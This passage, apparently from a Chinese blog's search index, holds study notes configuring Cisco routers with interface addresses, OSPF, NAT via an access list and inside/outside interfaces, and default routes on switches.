class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Router(config)#interface f0/0</span><br><span class="line">Router(config-if)#ip address 100.100.10.2 255.255.255.0</span><br><span class="line">Router(config-if)#no shutdown</span><br><span class="line">Router(config-if)#exit</span><br><span class="line">Router(config)#interface f0/1</span><br><span class="line">Router(config-if)#no shutdown</span><br><span class="line">Router(config-if)#ip address 100.100.20.1 255.255.255.0</span><br><span class="line">Router(config)#router ospf 1</span><br><span class="line">Router(config-router)#network 100.100.10.0 0.0.0.255 area 0</span><br><span class="line">Router(config-router)#network 100.100.20.0 0.0.0.255 area 0</span><br></pre></td></tr></table></figure><h5 id="R2"><a href="#R2" class="headerlink" title="R2:"></a>R2:</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Router(config)#interface f0/0</span><br><span class="line">Router(config-if)#ip address 100.100.20.2 255.255.255.0</span><br><span class="line">Router(config-if)#no shutdown </span><br><span class="line">Router(config-if)#exit</span><br><span class="line">Router(config)#interface f0/1</span><br><span class="line">Router(config-if)#no shutdown</span><br><span class="line">Router(config-if)#ip add 100.100.30.1 255.255.255.0</span><br><span class="line">Router(config)#router ospf 1</span><br><span class="line">Router(config-router)#network 100.100.20.0  0.0.0.255 area 0</span><br></pre></td></tr></table></figure><p>———————外网互通——————–</p><h3 id="内网上网的问题（内部能够访问公网）——–nat网络地址转换"><a href="#内网上网的问题（内部能够访问公网）——–nat网络地址转换" class="headerlink" title="内网上网的问题（内部能够访问公网）——–nat网络地址转换"></a>内网上网的问题（内部能够访问公网）——–nat网络地址转换</h3><h4 id="第一步-控制内网要上网的网段；（将这些网段连上公网）"><a href="#第一步-控制内网要上网的网段；（将这些网段连上公网）" class="headerlink" title="第一步:控制内网要上网的网段；（将这些网段连上公网）"></a>第一步:控制内网要上网的网段；（将这些网段连上公网）</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Router(config)#access-list 1 permit 192.168.10.0 0.0.0.255</span><br><span class="line">Router(config)#access-list 1 permit 192.168.20.0 0.0.0.255</span><br><span class="line">Router(config)#access-list 1 permit 192.168.30.0 0.0.0.255</span><br></pre></td></tr></table></figure><h4 id="第二步：做NAT转换"><a href="#第二步：做NAT转换" class="headerlink" title="第二步：做NAT转换"></a>第二步：做NAT转换</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Router(config)#ip nat inside source list 1(内网） interface e1/0（公有地址的接口）</span><br></pre></td></tr></table></figure><h4 id="第三步：指定内外网接口"><a href="#第三步：指定内外网接口" class="headerlink" title="第三步：指定内外网接口"></a>第三步：指定内外网接口</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Router(config)#interface f0/0 （内网接口）</span><br><span class="line">Router(config-if)#ip nat inside</span><br><span class="line">Router(config-if)#exit</span><br><span class="line">Router(config)#interface f0/1  （内网接口）</span><br><span class="line">Router(config-if)#ip nat inside</span><br><span class="line">Router(config-if)#exit</span><br><span class="line">Router(config)#interface e1/0  （公有接口）</span><br><span class="line">Router(config-if)#ip nat outside</span><br></pre></td></tr></table></figure><h5 id="swi0"><a href="#swi0" class="headerlink" title="swi0"></a>swi0</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Switch(config)#ip route 0.0.0.0 0.0.0.0 192.168.70.2</span><br></pre></td></tr></table></figure><h5 id="sw1"><a href="#sw1" class="headerlink" title="sw1"></a>sw1</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Switch(config)#ip route 0.0.0.0 0.0.0.0 192.168.60.2</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 学习笔记 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
